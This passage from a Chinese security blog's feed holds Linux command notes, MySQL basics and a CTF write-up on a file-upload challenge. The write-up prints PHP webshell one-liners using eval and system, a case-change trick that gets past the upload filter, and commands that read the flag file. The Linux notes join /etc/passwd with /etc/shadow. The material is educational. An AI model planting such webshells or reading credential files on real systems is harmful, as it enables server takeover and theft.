<tr>
<td>-s</td>
<td style="text-align:left">去除set1指定的在输入文本中连续并重复的字符</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 删除 &quot;hello shiyanlou&quot; 中所有的&apos;o&apos;,&apos;l&apos;,&apos;h&apos;</span><br><span class="line">$ echo &apos;hello shiyanlou&apos; | tr -d &apos;olh&apos;</span><br><span class="line"># 将&quot;hello&quot; 中的ll,去重为一个l</span><br><span class="line">$ echo &apos;hello&apos; | tr -s &apos;l&apos;</span><br><span class="line"># 将输入文本，全部转换为大写或小写输出</span><br><span class="line">$ cat /etc/passwd | tr &apos;[:lower:]&apos; &apos;[:upper:]&apos;</span><br><span class="line"># 上面的&apos;[:lower:]&apos; &apos;[:upper:]&apos;你也可以简单的写作&apos;[a-z]&apos; &apos;[A-Z]&apos;,当然反过来将大写变小写也是可以的</span><br></pre></td></tr></table></figure>
<h3><span id="col-命令">col 命令</span></h3><p>col 命令可以将Tab换成对等数量的空格建，或反转这个操作。</p>
<table>
<thead>
<tr>
<th>选项</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-x</td>
<td style="text-align:left">将Tab转换为空格</td>
</tr>
<tr>
<td>-h</td>
<td style="text-align:left">将空格转换为Tab（默认选项）</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查看 /etc/protocols 中的不可见字符，可以看到很多 ^I ，这其实就是 Tab 转义成可见字符的符号</span><br><span class="line">$ cat -A /etc/protocols</span><br><span class="line"># 使用 col -x 将 /etc/protocols 中的 Tab 转换为空格,然后再使用 cat 查看，你发现 ^I 不见了</span><br><span class="line">$ cat /etc/protocols | col -x | cat -A</span><br></pre></td></tr></table></figure>
<h3><span id="join-命令">join 命令</span></h3><p>将两个文件中包含相同内容的那一行合并在一起</p>
<table>
<thead>
<tr>
<th>选项</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-t</td>
<td style="text-align:left">指定分隔符，默认为空格</td>
</tr>
<tr>
<td>-i</td>
<td style="text-align:left">忽略大小写的差异</td>
</tr>
<tr>
<td>-1</td>
<td style="text-align:left">指明第一个文件要用哪个字段来对比，，默认对比第一个字段</td>
</tr>
<tr>
<td>-2</td>
<td style="text-align:left">指明第二个文件要用哪个字段来对比，，默认对比第一个字段</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 创建两个文件</span><br><span class="line">$ echo &apos;1 hello&apos; &gt; file1</span><br><span class="line">$ echo &apos;1 shiyanlou&apos; &gt; file2</span><br><span class="line">$ join file1 file2</span><br><span class="line"># 将/etc/passwd与/etc/shadow两个文件合并，指定以&apos;:&apos;作为分隔符</span><br><span class="line">$ sudo join -t&apos;:&apos; /etc/passwd /etc/shadow</span><br><span class="line"># 将/etc/passwd与/etc/group两个文件合并，指定以&apos;:&apos;作为分隔符, 分别比对第4和第3个字段</span><br><span class="line">$ sudo join -t&apos;:&apos; -1 4 /etc/passwd -2 3 /etc/group</span><br></pre></td></tr></table></figure>
<h3><span id="paste命令">paste命令</span></h3><p>在不对比数据的情况下，简单地将多个文件合并一起，以Tab隔开</p>
<table>
<thead>
<tr>
<th>选项</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td style="text-align:left">指定合并的分隔符，默认为Tab</td>
</tr>
<tr>
<td>-s</td>
<td style="text-align:left">不合并到一行，每个文件为一行</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ echo hello &gt; file1</span><br><span class="line">$ echo shiyanlou &gt; file2</span><br><span class="line">$ echo www.shiyanlou.com &gt; file3</span><br><span class="line">$ paste -d &apos;:&apos; file1 file2 file3</span><br><span class="line">$ paste -s file1 file2 file3</span><br></pre></td></tr></table></figure>
<h1><span id="linux下软件安装">Linux下软件安装</span></h1><h2><span id="linxu上的软件安装">linxu上的软件安装</span></h2><p>通常Linux上的软件安装主要有三种方式：</p>
<ul>
<li>在线安装</li>
<li>从磁盘安装deb软件包</li>
<li>从二进制软件包安装</li>
<li>从源代码编译安装</li>
</ul>
<h2><span id="在线安装">在线安装</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install tools</span><br></pre></td></tr></table></figure>
<p>apt-get包含的常用的一些工具</p>
<table>
<thead>
<tr>
<th>工具</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>install</td>
<td style="text-align:left">其后加上软件包名，用于安装一个软件包</td>
</tr>
<tr>
<td>update</td>
<td style="text-align:left">从软件源镜像服务器上下载/更新用于更新本地软件源的软件包列表</td>
</tr>
<tr>
<td>upgrade</td>
<td style="text-align:left">升级本地可更新的全部软件包，但存在依赖问题时将不会升级，通常会在更新之前执行一次update</td>
</tr>
<tr>
<td>dist-upgrade</td>
<td style="text-align:left">解决依赖关系并升级(存在一定危险性)</td>
</tr>
<tr>
<td>remove</td>
<td style="text-align:left">移除已安装的软件包，包括与被移除软件包有依赖关系的软件包，但不包含软件包的配置文件</td>
</tr>
<tr>
<td>autoremove</td>
<td style="text-align:left">移除之前被其他软件包依赖，但现在不再被使用的软件包</td>
</tr>
<tr>
<td>purge</td>
<td style="text-align:left">与remove相同，但会完全移除软件包，包含其配置文件</td>
</tr>
<tr>
<td>clean</td>
<td style="text-align:left">移除下载到本地的已经安装的软件包，默认保存在/var/cache/apt/archives/</td>
</tr>
<tr>
<td>autoclean</td>
<td style="text-align:left">移除已安装的软件的旧版本软件包</td>
</tr>
</tbody>
</table>
<p>apt-get常用的参数 </p>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-y</td>
<td style="text-align:left">自动回应是否安装软件包的选项，在一些自动化安装脚本中使用这个参数将十分有用</td>
</tr>
<tr>
<td>-s</td>
<td style="text-align:left">模拟安装</td>
</tr>
<tr>
<td>-q</td>
<td style="text-align:left">静默安装方式，指定多个q或者-q=#,#表示数字，用于设定静默级别，这在你不想要在安装软件包时屏幕输出过多时很有用</td>
</tr>
<tr>
<td>-f</td>
<td style="text-align:left">修复损坏的依赖关系</td>
</tr>
<tr>
<td>-d</td>
<td style="text-align:left">只下载不安装</td>
</tr>
<tr>
<td>–reinstall</td>
<td style="text-align:left">重新安装已经安装但可能存在问题的软件包</td>
</tr>
<tr>
<td>–install-suggests</td>
<td style="text-align:left">同时安装APT给出的建议安装的软件包</td>
</tr>
</tbody>
</table>
<h3><span id="安装软件">安装软件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get --reinstall install  &lt;软件包名&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="软件升级">软件升级</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 更新软件源</span><br><span class="line">$ sudo apt-get update</span><br><span class="line"># 升级没有依赖问题的软件包</span><br><span class="line">$ sudo apt-get upgrade</span><br><span class="line"># 升级并解决依赖关系</span><br><span class="line">$ sudo apt-get dist-upgrade</span><br></pre></td></tr></table></figure>
<h3><span id="卸载软件">卸载软件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove w3m</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 不保留配置文件的移除</span><br><span class="line">$ sudo apt-get purge w3m</span><br><span class="line"># 或者 sudo apt-get --purge remove</span><br><span class="line"># 移除不再需要的被依赖的软件包</span><br><span class="line">$ sudo apt-get autoremove</span><br></pre></td></tr></table></figure>
<h3><span id="软件搜索">软件搜索</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-cache search softname1 softname2 softname3……</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[百度杯CTF比赛Writeup]]></title>
      <url>https://uknowsec.cn/posts/ctf/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E6%AF%94%E8%B5%9BWriteup.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="0x00-前言">0x00 前言</span></h2><p>i春秋和百度联合推出的一个CTF比赛，由于本人太菜。只能随便玩玩，多学多问。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/psb.jpg" alt=""></p>
<h2><span id="0x01-正文">0x01 正文</span></h2><h3><span id="upload">Upload</span></h3><h4><span id="题目">题目</span></h4><p>Upload<br>描述：想怎么传就怎么传，就是这么任性。<br>tips:flag在flag.php中    </p>
<h4><span id="解题思路">解题思路</span></h4><p>打开题目题目链接，是一个文件上传的题。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903224648.png" alt=""><br>然后打开/flag.php<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903224800.png" alt=""><br>直接上传传统的PHP一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval_r($_POST[sb])?&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903225057.png" alt=""><br>发现过滤了 &lt;?php</p>
<p>然后在网上找到了另一种php一句话的木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903225859.png" alt=""><br>查看源码显示过滤了php</p>
<p>php改为PHP继续上传<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903230202.png" alt=""><br>查看源码没有显示</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8721.png" alt=""><br>找这里就没思路了，吃饭。去图书馆，下午回来问问大表哥</p>
<p>表哥告诉我不要传传统的PHP一句话<br>换个姿势，然后告诉我 PHP有4种开始和结束标记<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8717.png" alt=""><br>果断百度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">&lt;?php echo &apos;if you want to serve XHTML or XML documents, do like this&apos;; ?&gt;</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">echo &apos;some editors (like FrontPage) don&apos;t</span><br><span class="line">like processing instructions&apos;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">3.</span><br><span class="line">&lt;? echo &apos;this is the simplest, an SGML processing instruction&apos;; ?&gt;</span><br><span class="line">&lt;?= expression ?&gt; This is a shortcut for &quot;&lt;? echo expression ?&gt;&quot;</span><br><span class="line"></span><br><span class="line">4.</span><br><span class="line">&lt;% echo &apos;You may optionally use ASP-style tags&apos;; %&gt;</span><br><span class="line">&lt;%= $variable; # This is a shortcut for &quot;&lt;% echo . . .&quot; %&gt;</span><br></pre></td></tr></table></figure></p>
<p>发现第二种上午用过，但是不行<br>表哥说换个姿势，用system()函数调用系统命令<br>由于个人能力太差，写了半天才写出一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>PHP大写绕过，上传！<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903231450.png" alt=""><br>执行3.php?id=ls<br>发现php_errors.log日志文件，找到表哥说的绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/u</span><br></pre></td></tr></table></figure></p>
<p>然后表哥说直接命令查就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd  //同样得到 /var/www/html/u</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8717.png" alt=""><br>然后利用cat 查看文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1．命令格式：</span><br><span class="line"></span><br><span class="line">cat [选项] [文件]...</span><br><span class="line"></span><br><span class="line">2．命令功能：</span><br><span class="line"></span><br><span class="line">cat主要有三大功能：</span><br><span class="line"></span><br><span class="line">1.一次显示整个文件:cat filename</span><br><span class="line"></span><br><span class="line">2.从键盘创建一个文件:cat &gt; filename 只能创建新文件,不能编辑已有文件.</span><br><span class="line"></span><br><span class="line">3.将几个文件合并为一个文件:cat file1 file2 &gt; file</span><br><span class="line"></span><br><span class="line">3．命令参数：</span><br><span class="line"></span><br><span class="line">-A, --show-all           等价于 -vET</span><br><span class="line"></span><br><span class="line">-b, --number-nonblank    对非空输出行编号</span><br><span class="line"></span><br><span class="line">-e                       等价于 -vE</span><br><span class="line"></span><br><span class="line">-E, --show-ends          在每行结束处显示 $</span><br><span class="line"></span><br><span class="line">-n, --number     对输出的所有行编号,由1开始对所有输出的行数编号</span><br><span class="line"></span><br><span class="line">-s, --squeeze-blank  有连续两行以上的空白行，就代换为一行的空白行 </span><br><span class="line"></span><br><span class="line">-t                       与 -vT 等价</span><br><span class="line"></span><br><span class="line">-T, --show-tabs          将跳格字符显示为 ^I</span><br><span class="line"></span><br><span class="line">-u                       (被忽略)</span><br><span class="line"></span><br><span class="line">-v, --show-nonprinting   使用 ^ 和 M- 引用，除了 LFD 和 TAB 之外</span><br></pre></td></tr></table></figure></p>
<p>根据上面的知识，构建下面的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../u/3.php?id=cat /var/www/html/flag.php</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903232502.png" alt=""><br>查看源码得到flag,唉！不容易，自己的知识太少了。</p>
<h4><span id="flag">Flag</span></h4><p>flag{90969a8b-9e19-4247-8654-a10eeeb48314}</p>
<h4><span id="此题小结">此题小结</span></h4><p>才发现做个CTF不是那么容易的，一个看起来简单的上传绕过的题目。包含了PHP，Linxu系统命令，等等很多内容。也发现了自己有很多不足。幸亏有表哥的帮助，在此感觉依风表哥帮助和指导，下面两个题等明天在看别人的Writeup或者请教表哥吧！</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL数据库基础与实例]]></title>
      <url>https://uknowsec.cn/posts/notes/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%9E%E4%BE%8B.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="mysql基础知识">MySQL基础知识</span></h1><p>MySQL是最受欢迎的开源关系数据库管理系统，有瑞典MySQL AB公司开发。2008年1月MySQL被美国的SUN公司收购，2009年4月SUN公司又被美国的甲骨文（Oracle）公司收购。</p>
<h2><span id="mysql的特点">MySQL的特点</span></h2><p>MySQL是一个单进程多线程、支持多用户、基于客户机/服务端（Client/Server， C/S）的关系数据库管理系统。与其他数据库管理系统（DBMS）相比，MySQL具有体积小、易于安装、运行速度快、功能齐全、成本低廉、开源、性能高效、跨平台支持、简单易用以及支持多用户等特点。</p>
<h2><span id="mysql服务器的安装">MySQL服务器的安装</span></h2><p><a href="https://www.baidu.com/s?ie=utf-8&amp;f=3&amp;rsv_bp=1&amp;tn=monline_3_dg&amp;wd=mysql%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B&amp;oq=MySQL%E7%9A%84%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B%E5%9B%BE&amp;rsv_pq=b00d663c00006bf5&amp;rsv_t=b75foeWyNzqw1JsrhOMySTBjWEBnJT3RNpfrmv8xNT4d2xAaW4fs%2FO1%2BnJwFxWv%2BPzR6&amp;rqlang=cn&amp;rsv_enter=1&amp;inputT=4620&amp;rsv_sug3=36&amp;rsv_sug1=16&amp;rsv_sug7=100&amp;rsv_sug2=1&amp;prefixsug=MySQL%E5%AE%89%E8%A3%85&amp;rsp=0&amp;rsv_sug4=7744" target="_blank" rel="noopener">mysql安装教程</a></p>
<h2><span id="启动与停止mysql服务">启动与停止MySQL服务</span></h2><p>方法一：“开始”-&gt;“运行”，输入“service.msc”<br>方法二：“我的电脑”-&gt;“管理”-&gt;“计算机管理”-&gt;“服务和应用程序”-&gt;“服务”<br>方法三：使用Windows操作系统的控制面板也可以找到“服务”窗口。<br>方法四：“开始”-&gt;“运行”-&gt;“输入cmd”-&gt;“net start mysql开启或net stop mysql”</p>
<h2><span id="连接mysql服务器">连接MySQL服务器</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -P 3306 -u root -proot </span><br><span class="line">mysql -h 127.0.0.1 -u root -p </span><br><span class="line"></span><br><span class="line">-h : host MySQL服务器主机名或者IP地址</span><br><span class="line">-P : Port MySQL服务的端口号，如果是默认端口3306，则 -P 参数可以省略</span><br><span class="line">-u : user MySQL账号名</span><br><span class="line">-p : pwd MySQL账户名对应的密码</span><br></pre></td></tr></table></figure>
<p>每条MySQL命令或者SQL语句应该以“;”或者“\g”结束<br>键入“help;”或者“\h”命令，即可查看帮助信息。</p>
<h2><span id="字符集及字符序">字符集及字符序</span></h2><p>字符（character）是人类语言最小的表义符号，给定一系列字符，并对每个字符赋予一个数值，用数值来代表对应的字符，这个数值就是字符的编码（character encoding），给定一系列字符并赋予对应的编码后，所有这些“字符和编码对”组成的集合就是字符集（character set）。<br>字符序（collation）是指在统一字符之内的比较规则。一个字符集可以包含多种字符序，每个字符集有一个默认的字符序（default collation），每一个字符唯一对应一种字符。MySQL字符序命名规则是：以字符序对应的字符集名称开头，以国家名居中（或以general居中），以ci、cs或bin结尾。以ci结尾的字符序表示大小写不敏感，以cs结尾的字符序表示大小写敏感。</p>
<h2><span id="mysql字符集与字符序">MySQL字符集与字符序</span></h2><p>MySQL为了节省存储空间，在默认情况下，一个gbk英文字符通常仅占用一个字节（8位）的存储空间，一个utf8英文字符仅占用一个字节（8位）的存储空间。<br>MySQL客户机成功连接MySQL服务器后，使用MySQL命令“show character set;”即可查看当前MySQL服务实例支持的字符集、字符集默认的字符序以及字符集占用的最大字节长度等信息。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720160902190951.png" alt=""><br>使用MySQL命令“show variables like ‘character%’;”即可查看当前MySQL会话使用的字符集。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160902191609.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">character_set_client：MySQL客户机的字符集</span><br><span class="line">character_set_connection：数据通信链路的字符集，当MySQL客户机向服务器发送请求时，请求数据以该字符集进行编码。</span><br><span class="line">character_set_database：数据库字符集。</span><br><span class="line">character_set_filesystem：MySQL服务器文件系统的字符集，该值是固定的binary.</span><br><span class="line">character_set_result：结果集的字符集，MySQL服务器向MySQL客户机返回执行结果时，执行结果以该字符集进行编码。</span><br><span class="line">character_set_server：MySQL服务实例字符集。</span><br><span class="line">character_set_system：元数据（字段名、表名、数据库名等）的字符集。</span><br></pre></td></tr></table></figure></p>
<h2><span id="mysql字符集的设置">MySQL字符集的设置</span></h2><p>方法：修改my.ini配置文件，可修改MySQL默认的字符集。</p>
<h2><span id="创建数据库">创建数据库</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用SQL语句“create database database_name;”</span><br></pre></td></tr></table></figure>
<p>创建数据库后，MySQL服务实例自动在 ·\·\date\ 目录创建“database_name”目录及相关数据库文件（如db.opt）<br>db.opt文件的主要功能是记录当前数据库的默认字符集及字符序等信息。</p>
<h2><span id="查看数据库">查看数据库</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用MySQL命令“show datadases;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160902193439.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">information_schema:用于收集MySQL服务器的性能参数，确保了数据安全。</span><br><span class="line">performance_schema:用于收集MySQL服务器的性能参数，以便数据库管理员了解产生性能瓶颈的原因。</span><br><span class="line">information_schema系统数据库定义了所有数据库对象的元数据信息。例如所有数据库、表、字段、索引、约束、权限、存储引擎、字符集和触发器等信息都存储在information_schema数据库中。</span><br><span class="line">系统数据库由MySQL服务实例进程自动维护，普通用户建议不要修改系统数据库信息。</span><br></pre></td></tr></table></figure>
<h2><span id="显示数据库结构">显示数据库结构</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用MySQL命令“show create database database_name;&quot;</span><br></pre></td></tr></table></figure>
<p>可以查看名database_name数据库的结构。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160902194504.png" alt=""></p>
<h2><span id="选择当前操作的数据库">选择当前操作的数据库</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用SQL语句“use database_name;&quot;</span><br></pre></td></tr></table></figure>
<h2><span id="删除数据库">删除数据库</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用MySQL命令“drop database database_name;&quot;</span><br></pre></td></tr></table></figure>
<p>删除数据库后，MySQL服务实例会自动删除数据库目录及该数据库目录中的所有文件，数据库一旦删除，保存在该数据库中的数据将全部丢失。</p>
<h2><span id="myisam和innodb存储引擎">MyISAM和InnoDB存储引擎</span></h2><p>MySQL提供了插件式（pluggable）的存储引擎，存储引擎是基于表的。同一数据库，不同的表，存储引擎可以不同。甚至，同一个数据库表在不同的场合可以应用不同的存储引擎。目前，MySQL的存储引擎至少10种，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用MySQL命令“show engines;”</span><br></pre></td></tr></table></figure></p>
<p>即可查看MySQL服务实例支持的存储引擎。<br>MySQL常用的存储引擎有InnoDB存储引擎以及MyISAM存储引擎。</p>
<h3><span id="innodb存储引擎">InnoDB存储引擎</span></h3><p>InnoDB存储引擎是事务（transaction）安全的，并且支持外键（foreign key）。如果某张表主要提供OLTP支持，需要执行大量的增、删、该操作（即insert、delete、update语句），处于事务安全方面的考虑，InnoDB存储引擎是更好的选择。</p>
<h3><span id="myisam存储引擎">MyISAM存储引擎</span></h3><p>如果某张表主要提供OLAP支持，建议用MyISAM存储引擎。MyISAM具有检查和修复表的大多数工具。MyISAM表可以被压缩，而且最早支持全文索引，但MyISAM表不是事务安全的，也不支持外键。如果某表需要执行大量的select语句，出狱性能方面的考虑，MyISAM存储引擎是更好的选择。</p>
<h2><span id="设置默认的存储引擎">设置默认的存储引擎</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用MySQL命令“set default_storage_engine=MyISAM;&quot; 可以“临时地”将MySQL“当前会话的”存储引擎设置为MySIAM。</span><br><span class="line">使用MySQL命令“show engines;”查看当前引擎</span><br></pre></td></tr></table></figure>
<p>修改my.ini配置文件中的[mysqld]选项组中的default-storage-engine的参数值，并重启服务。可以“永久性”修改。</p>
<h2><span id="创建数据库表">创建数据库表</span></h2><p>表是数据库中最为重要的数据库对象。创建表前，需要根据数据库涉及的结果确定表名、字段名及数据类型、约束等信息，另外，还要为每张表选择一个合适的存储引擎。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use choose；</span><br><span class="line">set default_storage_engine=InnoDB;</span><br><span class="line">create table my_table(</span><br><span class="line">today datetiome,</span><br><span class="line">name char(20)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>对于InnoDB存储引擎的表而言，MySQL服务实例会在数据库目录自动创建一个名为表名、后缀名为frm的表结构定义文件my_table.frm。<br>对于MyISAM,MySQL服务实例除了自动创建frm表结构文件外，还会自动创建一个文件名为表名、后缀名为MYD的数据文件以及文件名为表名、后缀名为MYI的索引文件。</p>
<h2><span id="显示表结构">显示表结构</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用MySQL命令“show tables;&quot;即可查看当前操作的数据库中所有的表。</span><br><span class="line">使用MySQL命令“describe table_name;&quot;即可查看表名为table_name的表结构（describe也可以简写为desc）</span><br><span class="line">使用MySQL命令“show create table table_name;&quot;查看名为table_name表的详细信息。</span><br></pre></td></tr></table></figure>
<h2><span id="表记录的管理">表记录的管理</span></h2><p>表记录的管理包括表记录的更新操作以及表记录的查询操作（select），其中，表记录的更新操作包括表记录的插入（insert）、修改（update）以及删除（delete）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use choose;</span><br><span class="line">insert into my_table values(now(),&apos;a&apos;);</span><br><span class="line">insert into my_table values(now(),&apos;a&apos;);</span><br><span class="line">insert into my_table values(now(),NULL);</span><br><span class="line">insert into my_table values(now(),&apos;&apos;);</span><br></pre></td></tr></table></figure></p>
<p>now()函数返回MySQL服务器的当前日期以及时间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用MySQL命令“delect*from tables_name”负责查询table_name表中的所有记录。</span><br></pre></td></tr></table></figure>
